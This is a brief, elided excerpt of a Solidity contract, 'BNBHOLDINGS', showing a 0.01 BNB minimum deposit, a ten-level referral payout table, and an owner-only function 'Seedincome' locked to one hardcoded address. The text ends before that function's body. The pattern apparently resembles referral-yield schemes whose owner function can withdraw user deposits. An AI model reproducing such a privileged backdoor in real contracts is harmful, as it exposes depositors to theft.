...
contract BNBHOLDINGS {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 1e16; // Min 0.01 bnb 
	uint256[] public REFERRAL_PERCENTS 	= [1000, 400, 300, 200, 100, 100, 100, 100, 100, 100];
    ...
    modifier ownerOnly(){
        require(msg.sender == 0xEEef82C2f48D30B5B6bE0C54a28d874d752CC39A);
        _;
    }

    function Seedincome (uint256 _amount) public ownerOnly  {
